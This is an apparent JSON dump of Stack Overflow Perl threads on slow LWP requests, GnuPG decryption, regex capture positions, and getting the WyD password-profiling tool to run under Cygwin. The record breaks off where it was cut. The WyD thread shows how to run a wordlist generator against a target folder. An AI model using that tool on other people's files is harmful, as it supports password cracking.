[{"tags": ["perl", "lwp-useragent"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1485989136, "post_id": 41991202, "comment_id": 71159622, "body": "This probably has nothing to do with LWP. Try visiting that page in a regular web browser and looking at the response times in the browser&#39;s developer tools. It&#39;s probably just a poorly-built page, or it&#39;s generating massive amounts of data."}, {"owner": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "edited": false, "score": 0, "creation_date": 1485989227, "post_id": 41991202, "comment_id": 71159648, "body": "For me, the page takes a few seconds to load in a browser, and a few seconds using your code above. Seems to be pretty slow on the server side, not sure there&#39;s much more to it."}, {"owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "edited": false, "score": 0, "creation_date": 1485991151, "post_id": 41991202, "comment_id": 71160342, "body": "It loads in a couple of seconds in my browser but my script can take upwards of 2 minutes. Something else is at play. Also, I&#39;m now noticiing about half the time I get an error:  SSL connect attempt failed error:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failed at /usr/local/share/perl/5.20.2/LWP/Protocol/http.pm line 48, &lt;DATA&gt; line 1."}, {"owner": {"reputation": 7502, "user_id": 6368697, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yq4cG.jpg?s=128&g=1", "display_name": "Patrick Mevzek", "link": "https://stackoverflow.com/users/6368697/patrick-mevzek"}, "edited": false, "score": 0, "creation_date": 1485993599, "post_id": 41991202, "comment_id": 71161145, "body": "Other web pages on the same site (<a href=\"https://olms.dol-esa.gov/\" rel=\"nofollow noreferrer\">olms.dol-esa.gov</a>) or other sites ? If other site, it may be a DNS problem."}, {"owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "edited": false, "score": 0, "creation_date": 1485997765, "post_id": 41991202, "comment_id": 71162363, "body": "Just this site seems to be giving me problems."}], "answers": [{"tags": [], "owner": {"reputation": 7502, "user_id": 6368697, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yq4cG.jpg?s=128&g=1", "display_name": "Patrick Mevzek", "link": "https://stackoverflow.com/users/6368697/patrick-mevzek"}, "is_accepted": false, "score": 2, "last_activity_date": 1485994225, "creation_date": 1485994225, "answer_id": 41992185, "question_id": 41991202, "link": "https://stackoverflow.com/questions/41991202/how-to-determine-reason-for-slow-response-time-for-lwpuseragent-on-a-particula/41992185#41992185", "title": "How to determine reason for slow response time for LWP::UserAgent on a particular page?", "body": "<p>This hostname has serious DNS issues, see this <a href=\"http://dnsviz.net/d/olms.dol-esa.gov/WJJ24Q/\" rel=\"nofollow noreferrer\">DNSviz analysis</a>. This means that \"sometimes\" you will have trouble resolving the hostname as an IP address. This may lead to timeouts.</p>\n"}], "owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 432, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1485994225, "creation_date": 1485988906, "question_id": 41991202, "link": "https://stackoverflow.com/questions/41991202/how-to-determine-reason-for-slow-response-time-for-lwpuseragent-on-a-particula", "title": "How to determine reason for slow response time for LWP::UserAgent on a particular page?", "body": "<p>I have the following code:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse LWP::UserAgent;\n\nmy $ua = LWP::UserAgent-&gt;new;\nmy $response = $ua-&gt;get('https://olms.dol-esa.gov/query/getYearlyData.do');\nprint $response-&gt;decoded_content;\n</code></pre>\n\n<p>The code takes upwards of two minutes to print out the results. Other web pages print out within a second or two. I'm curious to know why this page takes so long to load. How can I figure out what the problem is?</p>\n"}, {"tags": ["windows", "bash", "perl"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 2, "creation_date": 1485978920, "post_id": 41988229, "comment_id": 71154481, "body": "Questions seeking debugging help (&quot;<b>why isn&#39;t this code working?</b>&quot;) must include the desired behavior, a <i>specific problem or error</i> and <i>the shortest code necessary</i> to reproduce it <b>in the question itself</b>. Questions without <b>a clear problem statement</b> are not useful to other readers. See: How to create a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 3, "creation_date": 1485979773, "post_id": 41988229, "comment_id": 71154943, "body": "Line 283 of your pastebin is <code>eval(&quot;use $_;&quot;);</code>, where <code>$_</code> is wlgmod::odt at the point of failure. The <code>use</code> is failing, probably because wlgmod::odt is not in <code>@INC</code>; you can confirm by adding <code>die $@ if $@;</code> immediately after the <code>eval</code>. It should work if you run the script from <code>&#47;cygdrive&#47;c&#47;WYD&#47;</code> (since <code>.</code> is automatically included in <code>@INC</code> in most perl installations). But it would be better to add <code>use FindBin; use lib &quot;$FindBin::Bin&#47;wlgmod&quot;;</code> to the top of the script so you can run it from anywhere."}, {"owner": {"reputation": 1744, "user_id": 1191147, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/cZDaT.jpg?s=128&g=1", "display_name": "Hashim Aziz", "link": "https://stackoverflow.com/users/1191147/hashim-aziz"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1485980147, "post_id": 41988229, "comment_id": 71155127, "body": "@MattJacob - That page doesn&#39;t seem to say an MCVE is required so much as recommended for &quot;better answers&quot;. In this instance, I can&#39;t provide one due to not understanding Perl, though that&#39;s certainly not out of laziness or lack of work, as the days I&#39;ve spent trying to resolve this issue so far attest to; I just don&#39;t have the time to learn a whole new language for this one use case. I don&#39;t see why that should be a barrier to asking a question about it."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1485980332, "post_id": 41988229, "comment_id": 71155242, "body": "The close reason literally says: &#39;Questions seeking debugging help (&quot;why isn&#39;t this code working?&quot;) must include the desired behavior, a specific problem or error and <b>the shortest code necessary to reproduce it in the question itself</b>.&#39; I don&#39;t know what could be clearer."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1485980460, "post_id": 41988229, "comment_id": 71155310, "body": "Correction, it should be just <code>use FindBin; use lib $FindBin::Bin;</code>"}, {"owner": {"reputation": 1744, "user_id": 1191147, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/cZDaT.jpg?s=128&g=1", "display_name": "Hashim Aziz", "link": "https://stackoverflow.com/users/1191147/hashim-aziz"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485980883, "post_id": 41988229, "comment_id": 71155524, "body": "@ThisSuitIsBlackNot - Thanks so much, that did the trick. For the record, running from WyD directory itself also worked, which I really should have tried. The script is now running and working fine, except that it&#39;s giving an error <code>Wide character in print at line 157</code>. It&#39;s not fatal though, so I can definitely live with it to solve another day. You have no idea how grateful I am to you for finally helping me solve this. Bounty given."}, {"owner": {"reputation": 1744, "user_id": 1191147, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/cZDaT.jpg?s=128&g=1", "display_name": "Hashim Aziz", "link": "https://stackoverflow.com/users/1191147/hashim-aziz"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1485981207, "post_id": 41988229, "comment_id": 71155688, "body": "@MattJacob - Fair enough if those are the rules, but I just don&#39;t see how that rule is productive. It seems self-defeating to require intimate knowledge of how a language and given program works - which reproducing the most minimal working code would require - from people there to learn how that language/program works. I don&#39;t ever remember Stack being this unnecessarily strict when I first joined."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1485982455, "post_id": 41988229, "comment_id": 71156391, "body": "Glad that worked. I added the relevant sections from your pastebin to the question and voted to reopen. We ask for an MCVE in the body of your question for several reasons: 1) It would be a pain for future visitors to wade through hundreds of lines of irrelevant code when they&#39;re searching for an answer to a similar problem. 2) If the link to pastebin breaks, future visitors won&#39;t be able to see the code that triggered the error message and their time will be wasted. 3) It can be difficult to impossible to track down an error without runnable code."}, {"owner": {"reputation": 1744, "user_id": 1191147, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/cZDaT.jpg?s=128&g=1", "display_name": "Hashim Aziz", "link": "https://stackoverflow.com/users/1191147/hashim-aziz"}, "edited": false, "score": 0, "creation_date": 1485986074, "post_id": 41988229, "comment_id": 71158194, "body": "Fair enough. Again, thanks for the help. I said I&#39;d give you bounty but I didn&#39;t realise you couldn&#39;t do that without an answer to award bounty to, my bad."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1485986149, "post_id": 41988229, "comment_id": 71158229, "body": "<code>$FindBin::RealBin</code> is safer than <code>$FindBin::Bin</code>"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485987006, "post_id": 41988229, "comment_id": 71158663, "body": "@ikegami Thanks for the reminder, I always forget about RealBin."}], "owner": {"reputation": 1744, "user_id": 1191147, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/cZDaT.jpg?s=128&g=1", "display_name": "Hashim Aziz", "link": "https://stackoverflow.com/users/1191147/hashim-aziz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 327, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1486006469, "creation_date": 1485977887, "last_edit_date": 1495535367, "question_id": 41988229, "link": "https://stackoverflow.com/questions/41988229/why-do-i-get-cant-locate-object-method-init-via-package-wlgmododt-when", "title": "Why do I get &#39;Can&#39;t locate object method &quot;init&quot; via package &quot;wlgmod::odt&quot;&#39; when I try to run wyd.pl in Cygwin?", "body": "<p>I'm trying to run a Perl script called <a href=\"http://www.darknet.org.uk/2006/11/wyd-automated-password-profiling-tool/\" rel=\"nofollow noreferrer\">WyD</a> using Cygwin on Windows. Cygwin is installed at <code>C:\\cygwin64</code>, and WyD is installed at <code>C:\\wyd\\wyd.pl</code>. Both are in the Windows <code>PATH</code> environment variable as <code>C:\\cygwin64</code> and <code>C:\\wyd</code> respectively.</p>\n\n<p>When running WyD with bash/Mintty using:</p>\n\n<p><code>wyd.pl -b -e -t -s 3 -o \"OUTPUTTEDWORDLIST\" \"TARGETFOLDER\"</code></p>\n\n<p>...I get the following error:</p>\n\n<blockquote>\n  <p>Can't locate object method \"init\" via package \"wlgmod::odt\" (perhaps\n  you forgot to load \"wlgmod::odt\"?) at /cygdrive/c/WYD/wyd.pl line 284.</p>\n</blockquote>\n\n<p>Sometimes <code>wlgmod::odt</code> is replaced with <code>wlgmod::doc</code> or any other document type, but running the script always generates that same basic error.  A <a href=\"https://stackoverflow.com/a/41930045/1191147\">previous answer</a> to this question recommended installing several dependencies, which turned out to be a mere copy-paste of an answer for Ubuntu systems, and didn't solve the error, so I've decided to start at the beginning and re-ask the question with more details. I also have all Perl packages in the Cygwin installer installed.</p>\n\n<p>After everything I've tried and done to get this script working, I can personally think of two possible causes for the error. Think of these as a guide more than anything else.</p>\n\n<ol>\n<li><p>The error above references line 284 in the <code>wyd.pl</code> script, so it's possible that something in that script is hardcoded so that it doesn't work with Cygwin/Windows, or just generally has a compatibility bug. I don't understand Perl, so I can't confirm this.</p></li>\n<li><p>I notice that the installation of WyD at <code>C:\\wyd</code> contains a folder called <code>wlgmod</code>, and that folder contains all the files that the above error seems to be looking for; <code>doc.pm</code>, <code>html.pm</code>, <code>jpeg.pm</code>, etc. If those files exist in that directory but bash is unable to find them, maybe it's due to the fact WyD needs to be run from within Cygwin itself. I've only recently thought about this possibility, and my knowledge of both Cygwin and WyD is too sparse to definitively know how both work. Is it even possible to run WyD from within the Cygwin folder? It's not a package so can't be installed as one, and therefore I'm not sure how that would work.</p></li>\n</ol>\n\n<p>Here are the relevant sections of the script:</p>\n\n<pre><code># Module hash containing module name and supported file extensions\n# Multiple extensions are seperated using ';'\nmy %wlgmods = (\n           'wlgmod::strings', '',           # only used with command-line switch\n           'wlgmod::plain'  , '.txt',       # used for all MIME text/plain as well\n           'wlgmod::html'   , '.html;.htm;.php;.php3;.php4',\n           'wlgmod::doc'    , '.doc',\n           'wlgmod::pdf'    , '.pdf',\n           'wlgmod::mp3'    , '.mp3',\n           'wlgmod::ppt'    , '.ppt',\n           'wlgmod::jpeg'   , '.jpeg;.jpg;.JPG;.JPEG',\n           'wlgmod::odt'    , '.odt;.ods;.odp'\n           );\n\n...\n\n# Initialize possible modules\nforeach(keys %wlgmods) {\n    eval(\"use $_;\");\n    my $ret = $_-&gt;init(); # line 284\n\n    # If module failed, add errortext and remove from hash\n    if($ret) {\n        $retvals .= \"$_: $ret\\n\";\n        delete $wlgmods{$_};\n        $ret = \"\";\n    }\n}\n</code></pre>\n"}, {"tags": ["perl", "gnupg"], "answers": [{"tags": [], "owner": {"reputation": 49, "user_id": 4654137, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/d79956107c47f818cb8a3af6ba478e3e?s=128&d=identicon&r=PG&f=1", "display_name": "user4654137", "link": "https://stackoverflow.com/users/4654137/user4654137"}, "is_accepted": false, "score": 1, "last_activity_date": 1485960796, "creation_date": 1485960796, "answer_id": 41982746, "question_id": 41982363, "link": "https://stackoverflow.com/questions/41982363/perl-gnupg-returns-no-seckey-even-with-a-specified-password/41982746#41982746", "title": "Perl GnuPG returns NO_SECKEY even with a specified password", "body": "<p>Appears that in order to get it running, you must fully specify the locations of the GnuPG homedir, options file &amp; gpg_path whenever you're calling the GnuPG constructor:</p>\n\n<blockquote>\n  <p>$gpg = new GnuPG ( gnupg_path => \"/usr/bin/gpg\", homedir => \"/home/your_username/.gnupg/\", options => \"/home/your_username/.gnupg/gpg.conf\");</p>\n</blockquote>\n\n<p><em>(Tested on Debian 8)</em></p>\n"}], "owner": {"reputation": 49, "user_id": 4654137, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/d79956107c47f818cb8a3af6ba478e3e?s=128&d=identicon&r=PG&f=1", "display_name": "user4654137", "link": "https://stackoverflow.com/users/4654137/user4654137"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 215, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1485960796, "creation_date": 1485959789, "question_id": 41982363, "link": "https://stackoverflow.com/questions/41982363/perl-gnupg-returns-no-seckey-even-with-a-specified-password", "title": "Perl GnuPG returns NO_SECKEY even with a specified password", "body": "<p>I'm doing a small program, a part of which has to decipher gpg messages that are transmitted between two pcs. Unfortunately the perl GnuPG library returns:</p>\n\n<blockquote>\n  <p>GnuPG::abort_gnupg(GnuPG=HASH(0x1ddba80), \"Protocol error: expected NEED_PASSPHRASE.* got NO_SECKEY\\x{a}\")</p>\n</blockquote>\n\n<p>when I run this code:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse GnuPG;\n\nmy ($gpg, $msg, $dec, $pwd, $tfile);\n\n$gpg = new GnuPG ( gnupg_path =&gt; \"/usr/bin/gpg\",);\n$pwd = \"pwd\";     #\n$msg = \"message\"; #\n$tfile = \"/tmp/local_scripts/temp.txt\";\n\nchomp $msg;\nopen (my $fh, \"&gt;\", $tfile) or die \"Cannot open temporary file: $!\";\nprint $fh $msg;\nclose ($fh);\n\n$gpg-&gt;decrypt\n(\n    symmetric =&gt; 1,\n    ciphertext =&gt; $tfile,\n    passphrase =&gt; $pwd,\n    output =&gt; $dec,\n);\n\nprint $dec;\n</code></pre>\n\n<p>Am I even using the right library to do this, or do I have to turn to Crypto::GnuPG (which, when tested, gave me \"Decryption failed: Can't find a secret key to decrypt message\", even with a specified password...) I'm lost really</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485959807, "post_id": 41981960, "comment_id": 71142479, "body": "<code>my @matches = ( &#39;xx1a2b3cyy&#39; =~ m&#47;^xx(\\d\\w)+&#47; );</code> contains only <code>3c</code>. Using <code>use re &#39;debug&#39;</code> on that tells us that it gets <code>1a</code>, <code>2b</code> and <code>3c</code> each as matches for the subpattern, but I have no idea where they end up. It looks like the last match of that first subpattern is saved as <code>$1</code> only, which explains why <code>@+</code> and <code>@-</code> only point to it."}, {"owner": {"reputation": 6728, "user_id": 2156952, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/3mMoE.gif?s=128&g=1", "display_name": "TrueY", "link": "https://stackoverflow.com/users/2156952/truey"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485960033, "post_id": 41981960, "comment_id": 71142619, "body": "@simbabque Yes, this is the same as &#39;Simple matching gives:&#39; codelet gives. Anyway without the &#39;g&#39; modifier it should not return more values."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485960206, "post_id": 41981960, "comment_id": 71142738, "body": "But if you add a <code>&#47;g</code> to my example, you also only get the last one."}, {"owner": {"reputation": 6728, "user_id": 2156952, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/3mMoE.gif?s=128&g=1", "display_name": "TrueY", "link": "https://stackoverflow.com/users/2156952/truey"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485964219, "post_id": 41981960, "comment_id": 71145709, "body": "@simbabque: Yes, you can get the last match, not all. It does not help me as I would like to have all. It seems only the <code>(?{ code })</code> may help... I have to check how it works with multiple capture groups with quantifier."}], "answers": [{"comments": [{"owner": {"reputation": 6728, "user_id": 2156952, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/3mMoE.gif?s=128&g=1", "display_name": "TrueY", "link": "https://stackoverflow.com/users/2156952/truey"}, "edited": false, "score": 0, "creation_date": 1485981046, "post_id": 41985078, "comment_id": 71155610, "body": "Thanks for your effort! Unfortunately they are fit to the current pattern in the example, and not a really RE independent solution. For example I have to now that the expression in the capture group is 2 char wide."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 6728, "user_id": 2156952, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/3mMoE.gif?s=128&g=1", "display_name": "TrueY", "link": "https://stackoverflow.com/users/2156952/truey"}, "edited": false, "score": 0, "creation_date": 1485985483, "post_id": 41985078, "comment_id": 71157896, "body": "There&#39;s no general solution. You&#39;re asking to use a regex as a parser, and that&#39;s a no-go."}, {"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1486001078, "post_id": 41985078, "comment_id": 71163174, "body": "Can you please elaborate on &quot;you could use %- to some extent&quot;? In my tries I can only find up to the number of actual capture groups with the same name as result, the quantifiers on them do not increase the number.  That would be the same to this problem as with positional captures. It would really help me if you can show me how you utilize <code>%-</code> better than that."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1486002175, "post_id": 41985078, "comment_id": 71163440, "body": "Nevermind, <code>%-</code> doesn&#39;t work as I thought it did. Removed that bit from my answer, and added another."}, {"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1486024807, "post_id": 41985078, "comment_id": 71171645, "body": "Thanks for the <code>$^R</code> / <code>$^N</code> examples, thought they would work only with lots and lots of <code>local</code> inside the embedded code before!"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1486051495, "post_id": 41985078, "comment_id": 71189658, "body": "@SREagle, (Just one <code>local</code> per match operator.) It&#39;s truly complicated, yet that&#39;s what&#39;s required to do what you want using a single match."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1486004130, "last_edit_date": 1486004130, "creation_date": 1485967396, "answer_id": 41985078, "question_id": 41981960, "link": "https://stackoverflow.com/questions/41981960/how-to-get-the-position-of-all-capture-groups-with-quantifiers/41985078#41985078", "title": "How to get the position of all capture groups with quantifiers?", "body": "<p>There's no general solution; the regex engine simply doesn't store the necessary information. You're asking to use a regex as a parser, and that's a no-go.</p>\n\n<hr>\n\n<pre><code>sub extract {\n   for ($_[0]) {\n      /^ xx /xg\n         or return ();\n\n      my @matches;\n      push @matches, $1 while /\\G (\\d\\w) /xg;\n      return @matches;\n   }\n}\n</code></pre>\n\n<p>or</p>\n\n<pre><code>sub extract {\n   my ($pairs) = $_[0] =~ /^xx((?:\\d\\w)+)/\n      or return ();\n\n   return unpack('(a2)*', $pairs);\n}\n</code></pre>\n\n<hr>\n\n<p>If you just want the positions, it's the same.</p>\n\n<pre><code>sub extract {\n   for ($_[0]) {\n      /^ xx /xg\n         or return ();\n\n      my @matches;\n      push @matches, $-[1] while /\\G (\\d\\w) /xg;\n      return @matches;\n   }\n}\n</code></pre>\n\n<p>or</p>\n\n<pre><code>sub extract {\n   $_[0] =~ /^xx((?:\\d\\w)+)/\n      or return ();\n\n   return map { $-[1] + ( $_ - 1 )*2 } 1..length($1)/2;\n}\n</code></pre>\n\n<hr>\n\n<p>Even a non-general purpose solution is extremely hard using regular expressions. Say you had the following pattern:</p>\n\n<pre><code>xx(\\d\\w)+yy(\\d\\w)+zz\n</code></pre>\n\n<p>The correct solution would be:</p>\n\n<pre><code>use Storable qw( dclone );\n\nmy $s = \"xx1a2byy3c4dZZ...xx5a6byy7c8dzz\";\n\nlocal our $rv;\nif (\n   $s =~ /\n      (?{ [] })\n      xx\n      (?: (\\d\\w) (?{ my $r = dclone($^R); push @{ $r-&gt;[0] }, $^N; $r }) )+\n      yy\n      (?: (\\d\\w) (?{ my $r = dclone($^R); push @{ $r-&gt;[1] }, $^N; $r }) )+\n      zz\n      (?{ $rv = $^R; })\n   /x\n) {\n   say \"\\$1: @{ $rv-&gt;[0] }\";\n   say \"\\$2: @{ $rv-&gt;[1] }\";\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>$1: 5a 6b\n$2: 7c 8d\n</code></pre>\n\n<p>And something like</p>\n\n<pre><code>(zz(\\d\\w)+)+\n</code></pre>\n\n<p>would need</p>\n\n<pre><code>use Storable qw( dclone );\n\nmy $s = \"zz1a2bzz3c4d\";\n\nlocal our $rv;\nif (\n   $s =~ /\n      (?{ [] })\n      (?:\n         (?{ my $r = dclone($^R); push @$r, []; $r })\n         zz\n         (?: (\\d\\w) (?{ my $r = dclone($^R); push @{ $r-&gt;[-1] }, $^N; $r }) )+\n      )+\n      (?{ $rv = $^R; })\n   /x\n) {\n   say \"\\$1: @$_\" for @$rv;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>$1: 1a 2b\n$1: 3c 4d\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1485981007, "post_id": 41986055, "comment_id": 71155588, "body": "You still have to check for an overall match - the embedded code gets executed immediately, if reached by the RE engine. Putting a <code>z</code> after the <code>+</code> results in a fail, but <code>@submatches</code> still contains all triggered submatches"}, {"owner": {"reputation": 6728, "user_id": 2156952, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/3mMoE.gif?s=128&g=1", "display_name": "TrueY", "link": "https://stackoverflow.com/users/2156952/truey"}, "edited": false, "score": 0, "creation_date": 1485982342, "post_id": 41986055, "comment_id": 71156327, "body": "Instead of <code>z</code> <code>(*FAIL)</code> might be used, so the backtracking engine will try all matches."}, {"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, 